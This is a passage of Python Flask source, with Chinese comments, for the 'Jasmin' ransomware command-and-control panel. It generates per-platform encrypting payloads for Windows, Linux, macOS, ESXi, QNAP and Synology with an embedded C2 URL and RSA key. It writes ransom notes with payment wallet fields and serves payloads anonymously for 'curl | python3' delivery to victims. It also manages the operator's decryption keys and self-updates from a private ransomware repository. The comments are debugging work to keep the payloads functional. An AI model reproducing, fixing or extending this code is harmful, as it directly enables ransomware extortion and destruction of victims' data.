    # 4 字节仅 32 bit 可暴力枚举；提到 16 字节 = 128 bit。
    tok = secrets.token_hex(16)
    tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl',
               'esxi':'esxi_payload.tpl','qnap':'qnap_payload.tpl','synology':'synology_payload.tpl'}
    ext_map = {'win':'.cs','linux':'.py','macos':'.py','esxi':'.sh','qnap':'.sh','synology':'.sh'}
    tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
    if not os.path.exists(tpl_path):
        return jsonify(ok=False, msg='模板文件缺失')
    tpl = open(tpl_path).read().replace('{{C2_URL}}',c2).replace('{{HANDSHAKE}}',sec)
    # 注入RSA公钥
    pub_path = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
    if os.path.exists(pub_path):
        tpl = tpl.replace('{{RSA_PUBLIC_KEY}}', open(pub_path).read().strip())
    else:
        return jsonify(ok=False, msg='RSA公钥缺失，请先生成密钥对')
    # 构建勒索信
    srv = re.sub(r'/handshake(\.php)?$', '', c2)
    if not srv: srv = 'http://<后台地址>'
    # 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh（纯 openssl），
    # Windows 用 jasmin_unlock.ps1（纯 PowerShell 7+，无需编译 exe）
    if plat == 'win':
        dec = ('Windows (requires PowerShell 7+)\n'
               f'  curl.exe -sL {srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n'
               f'  pwsh -File unlock.ps1 -Server {srv} -K "<passphrase>"')
    elif plat in ('esxi','qnap','synology'):
        # 三者都靠 SSH 进设备后用同一个零依赖脚本，但文案要说到点上 ——
        # 此前一律写成 "Linux / macOS"，等于在勒索信里教受害者用错的方法。
        _how = {
            'esxi':     'SSH into the ESXi host (Host > Manage > Services > TSM-SSH)',
            'qnap':     'first enable SSH: QNAP Control Panel > Network & File Services',
            'synology': 'first enable SSH: Synology Control Panel > Terminal & SNMP',
        }[plat]
        dec = ('NAS / hypervisor host - POSIX shell (pure openssl, no dependencies required)\n'
               f'  # {_how}\n'
               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"\n'
               f'  # if curl is unavailable:  wget -qO- {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"')
    else:
        dec = ('Linux / macOS (pure openssl, no dependencies required)\n'
               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"')
    dec += '\n  (Decrypts ALL encrypted files by default; append specific folders to limit scope)'
    _t = ransom['title']
    _sub = '' if 'ENCRYPT' in _t.upper() else '║  YOUR FILES HAVE BEEN ENCRYPTED\n'
    note = (f"╔══════════════════════════════════════════╗\n║  {_t}\n{_sub}"
            f"╚══════════════════════════════════════════╝\n\nSystem ID: {{sid}}\n\n{ransom['body']}\n")
    if ransom['price']: note += f"\nRansom Amount: {ransom['price']}"
    if ransom['wallet']: note += f"\nPayment Address: {ransom['wallet']}"
    if ransom['contact']: note += f"\nContact: {ransom['contact']}"
    note += (f"\n\nHow to Decrypt:\n{dec}\n\n"
             "Sha-256 integrity verification guarantees 100% file restoration.")
    if plat in ('esxi','qnap','synology'):
        # 三个平台都是 POSIX sh，模板里的字符串字面量用单引号，转义规则相同。
        # 此前只判了 esxi，qnap/synology 掉进下面的 Python 分支用 \' 转义 ——
        # 在 sh 单引号里那不是转义，引号照样提前收尾。已实测：qnap 载荷配
        # 含单引号的勒索信，sh -n 直接 rc=2 语法错误。
        tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","'\\''"))
        for k,v in ransom.items():
            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","'\\''"))
    elif plat == 'win':
        # C# 的 NOTE 是 verbatim string (@"...")：双引号要写成 ""，反斜杠不转义。
        # 旧实现与 linux/macos 共用 \" 转义 —— 在 verbatim string 里无效，
        # 引号提前结束字符串，生成的 .cs 编译不过。
        tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace('"','""'))
        for k,v in ransom.items():
            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace('"','""'))
    else:
        # linux/macos 模板用 Python 三引号字符串包裹勒索信。三引号内 ' 和 " 都需转义；
        # 反斜杠也必须转义：正文若含 \（或路径分隔符、行尾反斜杠）会破坏字符串字面量
        # 或与收尾的 \n""" 结合产生行连接符，生成不可解析/语义错误的载荷。
        # 转义顺序必须先 \ 再 ' 与 "（先转义自身，避免二次转义已有内容）。
        def _py_esc(s): return s.replace('\\','\\\\').replace("'","\\'").replace('"','\\"')
        tpl = tpl.replace('{{RANSOM_NOTE}}', _py_esc(note))
        for k,v in ransom.items():
            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', _py_esc(v))
    name = f'jasmin_{plat}_{ts}_{tok}{ext_map[plat]}'
    with open(os.path.join(PAYLOAD_DIR, name), 'w') as f: f.write(tpl)
    return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(os.path.join(PAYLOAD_DIR,name)))

@app.route('/payloads/<path:filename>')
def download_payload(filename):
    """载荷文件必须可匿名下载 —— 这是唯一的投递路径。

    受害机器上没有会话，投放方式就是 `curl -sL <url> | python3`（或 bash）。
    早先版本要求登录才能下载生成载荷，理由是"载荷内嵌 C2 与握手密钥"——
    这个理由不成立：载荷是明文脚本，拿到它的人本来就能从里面读出 C2 与密钥，
    拦截下载不增加任何安全性，却让载荷根本无法投放（匿名访问被 302 跳到登录页，
    `curl -sL | python3` 于是拿到一页 HTML，报出与真实原因毫不相干的语法错误）。

    真实风险只有文件名可枚举，已在生成侧把随机段提到 128 bit（见 generate 路由）。

    仍然匿名 403 的只有真正的密钥material：私钥、AES 口令、密钥备份 ——
    它们不需要匿名分发（解密侧取的是 .pem.enc 与 jasmin_unlock.*）。
    """
    base = os.path.basename(filename)
    # 一律拒收点开头的文件。PHP 侧靠 .htaccess 的 <FilesMatch "^\..+$"> 兜住，
    # 而 Flask 没有等价机制 —— 漏一个就是一个可匿名读到的内部状态文件
    # （.key_secret / .schema_rl / .pw_changed / .installed ...）。
    if base.startswith('.'):
        return 'Forbidden', 403
    if base in ('jasmin_private.pem',) or '.bak.' in base:
        return 'Forbidden', 403
    # ★ 所有路径拼接一律用 base（已 basename）而非原始 filename：
    #   上面几行校验的是 base，这里却拿 filename 去 join —— filename 含
    #   '../' 时 os.path.join 会跳出 PAYLOAD_DIR，isfile 判到目录外的文件（如
    #   /etc/passwd）为真，从而绕过"文件不存在"的 404 逻辑。虽然 send_from_directory
    #   的 safe_join 最终仍会拦下穿越（无实际泄露），但两处变量必须一致。
    path = os.path.join(PAYLOAD_DIR, base)
    if not os.path.isfile(path):
        # 明确 404，绝不重定向到登录页：静默跳转会被管道喂给解释器，
        # 报出的是 HTML 的语法错误，把"文件不存在"误导成"脚本有问题"。
        return 'Not found.', 404
    return send_from_directory(PAYLOAD_DIR, base, as_attachment=True)

@app.route('/download_key')
@login_required
def download_key():
    """密钥下载 — 需登录（与 PHP 端 download_file.php 对齐）。

    明文私钥与解密口令不可经公开的 /payloads/<path> 获取，
    只在这里经 login_required 鉴权后下发；直接 URL 访问一律 403。
    """
    base = os.path.basename(request.args.get('file', '') or '')
    allowed = {'jasmin_private.pem', 'jasmin_private.pem.enc',
               'jasmin_public.pem', '.key_secret'}
    if base not in allowed:
        return 'Access denied.', 403
    path = os.path.join(PAYLOAD_DIR, base)
    if not os.path.isfile(path):
        return 'File not found.', 404
    try:
        with open(path, 'rb') as fh:
            data = fh.read()
    except OSError:
        return 'File not readable (permission denied).', 500
    dl = 'jasmin_key_secret.txt' if base == '.key_secret' else base
    resp = Response(data, mimetype='application/octet-stream')
    resp.headers['Content-Disposition'] = 'attachment; filename="%s"' % dl
    resp.headers['Content-Length'] = str(len(data))
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    resp.headers['Cache-Control'] = 'no-store'
    return resp

# ── Update Check ──
_vf = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'VERSION')
if not os.path.exists(_vf):
    _vf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'VERSION')
CURRENT_VERSION = open(_vf).read().strip() if os.path.exists(_vf) else '0.0.0'

@app.route('/update')
@login_required
def check_update():
    import urllib.request
    token = os.environ.get('GIT_TOKEN','')
    headers = {'User-Agent':'Jasmin-C2'}
    if token: headers['Authorization'] = f'token {token}'
    # 获取远程VERSION
    remote_ver = ''
    try:
        req = urllib.request.Request('https://raw.githubusercontent.com/2016xyz/Jasmin-Ransomware-Private/master/VERSION', headers=headers)
        remote_ver = urllib.request.urlopen(req, timeout=10).read().decode().strip()
    except: pass
    # 获取最新commit
    sha=date=msg=''
    try:
        req2 = urllib.request.Request('https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/commits?per_page=1', headers=headers)
        data = json.loads(urllib.request.urlopen(req2, timeout=10).read())
        sha = data[0]['sha'][:7]
        date = data[0]['commit']['committer']['date']
        msg = data[0]['commit']['message']
    except: pass
    if not remote_ver and not sha:
        return jsonify(ok=True, current=CURRENT_VERSION, update=False, msg='无法连接更新服务器')
    has_update = bool(remote_ver and remote_ver != CURRENT_VERSION)
    return jsonify(ok=True, update=has_update, current=CURRENT_VERSION,
        latest=remote_ver or CURRENT_VERSION, latest_commit=sha, date=date, message=msg)

# ── KeyGen ──
@app.route('/keygen', methods=['POST'])
@login_required
def keygen():
    if not csrf_ok():
        return jsonify(ok=False, msg='CSRF 校验失败，请刷新页面重试'), 403

    # ── 重建保护 + 旧密钥归档 ──
    # PHP 侧 keygen.php 一直有这两条，Python 侧此前【两条都没有】：
    # 一次点击直接覆盖 jasmin_private.pem，此前所有受害者数据永久不可解 ——
    # 而且前端 confirm 挡不住直接调 API。这里与 PHP 行为对齐。
    _priv_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem')
    _existing = os.path.exists(_priv_path)
    if _existing and request.form.get('force') != '1':
        _pub = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
        _kid = ''
        if os.path.exists(_pub):
            _kid = hashlib.md5(open(_pub, 'rb').read()).hexdigest()[:8]
        return jsonify(ok=False, need_confirm=True, key_id=_kid,
                       msg='已存在密钥对。重新生成会让此前所有已加密数据永久无法解密，请确认后重试。')

    if _existing:
        _ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        for _f in ('jasmin_private.pem', 'jasmin_private.pem.enc',
                   'jasmin_public.pem', '.key_secret'):
            _src = os.path.join(PAYLOAD_DIR, _f)
            if os.path.exists(_src):
                try:
                    shutil.copy2(_src, _src + '.bak.' + _ts)
                except OSError:
                    pass

    from cryptography.hazmat.primitives.asymmetric import rsa as rsa_gen
    from cryptography.hazmat.primitives import serialization as ser
    from cryptography.hazmat.backends import default_backend
    key = rsa_gen.generate_private_key(65537, 2048, default_backend())
    priv = key.private_bytes(ser.Encoding.PEM, ser.PrivateFormat.TraditionalOpenSSL, ser.NoEncryption())
    pub = key.public_key().public_bytes(ser.Encoding.PEM, ser.PublicFormat.SubjectPublicKeyInfo)
    # AES-128-CBC 加密私钥。
    # 注：此处原注释写的是 "AES-256-CBC / 32 hex = 256 bit"，但 token_hex(16)
    # 只有 16 字节，实际就是 AES-128 —— 与 PHP 端 keygen.php 一致（那边也注释成 128）。
    # 注释写错导致解密器把两种格式的标签写反，已一并修正。
    import base64
    aes_key = secrets.token_hex(16)  # 32 hex chars = 16 bytes = AES-128
    iv = secrets.token_bytes(16)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    cipher = Cipher(algorithms.AES(bytes.fromhex(aes_key)), modes.CBC(iv), default_backend())
    enc = cipher.encryptor()
    pad_len = 16 - (len(priv) % 16)
    padded = priv + bytes([pad_len] * pad_len)
    enc_priv = enc.update(padded) + enc.finalize()
    enc_blob = base64.b64encode(iv + enc_priv).decode()
    # Save files
    priv_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem')
    enc_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem.enc')
    pub_path = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
    secret_path = os.path.join(PAYLOAD_DIR, '.key_secret')
    # 原子替换：集群里 python 有多个副本且共用一个卷，直接 open(w) 覆盖会
    # 让并发的两次 keygen 互相穿插，最终落出「公钥来自 A、私钥来自 B」的错配密钥对。
    def _atomic(path, data, mode='wb'):
        tmp = path + '.tmp'
        with open(tmp, mode) as fh:
            fh.write(data)
        os.replace(tmp, path)
    _atomic(priv_path, priv)
    _atomic(enc_path, enc_blob, 'w')
    _atomic(pub_path, pub)
    _atomic(secret_path, aes_key, 'w')
    # 0644: 密钥须可被服务进程读取。直接 URL (payloads/jasmin_private.pem 与
    #       .key_secret) 已被 download_payload 显式 403 拦截，
    #       私钥/口令仅经「需登录」的 /download_key 下发。
    for _p in (priv_path, enc_path, pub_path, secret_path):
        try:
            os.chmod(_p, 0o644)
        except OSError:
            pass
    return jsonify(ok=True, pub=pub.decode(), msg='RSA-2048 密钥对已生成，私钥已用 AES-128-CBC 加密存储')

@app.route('/do_update', methods=['POST'])
@login_required
def do_update():
    if not csrf_ok():
        return jsonify(ok=False, msg='CSRF 校验失败，请刷新页面重试'), 403
    import subprocess, zipfile, tempfile, shutil, urllib.request
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    token = os.environ.get('GIT_TOKEN','')
    # 方式1: git pull
    if os.path.isdir(os.path.join(root, '.git')):
        r = subprocess.run(['git', 'pull'], cwd=root, capture_output=True, text=True, timeout=30)
        return jsonify(ok=True, method='git pull', output=r.stdout + r.stderr)
    # 方式2: zip下载覆盖
    url = 'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/zipball/master'
    req = urllib.request.Request(url, headers={'User-Agent':'Jasmin-C2'})
    if token:
        req.add_header('Authorization', f'token {token}')
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        tmp = tempfile.mktemp(suffix='.zip')
        with open(tmp, 'wb') as f:
            f.write(resp.read())
        tmpdir = tempfile.mkdtemp()
        with zipfile.ZipFile(tmp, 'r') as zf:
            # ★ zip-slip：成员名里带 ../ 就能写出 tmpdir 之外（甚至覆盖 app.py 本体）。
            # 更新源一旦被投毒或被劫持，这条就是把任意文件写到任意路径。
            _base = os.path.realpath(tmpdir)
            for _m in zf.namelist():
                _dst = os.path.realpath(os.path.join(tmpdir, _m))
                if _dst != _base and not _dst.startswith(_base + os.sep):
                    return jsonify(ok=False, msg='更新包内含非法路径，已中止')
            zf.extractall(tmpdir)
        os.unlink(tmp)
        # 找到解压后的子目录
        dirs = [d for d in os.listdir(tmpdir) if os.path.isdir(os.path.join(tmpdir, d))]
        if not dirs:
            return jsonify(ok=False, msg='解压后未找到目录')
        src = os.path.join(tmpdir, dirs[0], 'Web Panel Python')
        if os.path.isdir(src):
            # 覆盖当前app目录(保留config.json和payloads)
            # 目标目录按本文件实际所在位置推导，而不是写死 /app ——
            # 写死会让非 Docker 部署的自更新必然失败。
            _appdir = os.path.dirname(os.path.abspath(__file__))
            for item in os.listdir(src):
                s = os.path.join(src, item)
                d = os.path.join(_appdir, item)
                if item in ('config.json', 'payloads'):
                    continue
                if os.path.isdir(s):
                    if os.path.exists(d): shutil.rmtree(d)
                    shutil.copytree(s, d)
                else:
                    shutil.copy2(s, d)
        shutil.rmtree(tmpdir)
        return jsonify(ok=True, method='zip下载', msg='更新完成，请刷新页面')
    except Exception as e:
        return jsonify(ok=False, msg=f'下载更新失败: {e}')

# ── Startup ──
# 建表与幂等迁移必须在模块导入时执行 —— 容器用 `gunicorn app:app` 启动，
# 此时 __name__ == 'app'，写在 __main__ 里的初始化永远不会跑，
# 老库缺列会让 dashboard 直接 500。
if is_installed():
    try:
        with app.app_context():
            db.create_all()
            ensure_schema()
    except Exception as _e:
        print(f'[schema] startup init skipped: {_e}')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
